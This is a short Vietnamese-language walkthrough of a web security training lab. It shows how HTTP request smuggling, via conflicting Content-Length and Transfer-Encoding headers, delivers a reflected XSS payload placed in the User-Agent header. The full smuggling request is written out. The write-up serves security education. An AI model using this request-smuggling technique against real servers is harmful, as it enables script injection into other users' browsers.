# Lab: Exploiting HTTP request smuggling to deliver reflected XSS

## Detect

Lab này tận dụng request smuggling để đẩy một request `GET /post?postId=6` sang back-end, đồng thời chèn payload XSS vào header `User-Agent`.

## Vì sao có thể khai thác

Ứng dụng phản chiếu một phần header của request trong response. Nếu smuggle được request chứa payload độc hại, nội dung phản chiếu đó sẽ chạy trong trình duyệt của nạn nhân.

## Exploit

Payload dùng để trigger XSS:

```http
POST / HTTP/1.1
Host: 0a9a0033037214db806e03e6003100b0.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 153
Transfer-Encoding: chunked

0

GET /post?postId=6 HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 5
User-Agent: foobar"><script>alert(1)</script>

x=
```

Khi back-end xử lý request smuggled và phản chiếu `User-Agent`, script sẽ thực thi trong response của post.

Mấu chốt của bài này là biến request smuggled thành một vector XSS reflected, không chỉ là bypass hoặc capture request như các lab trước.
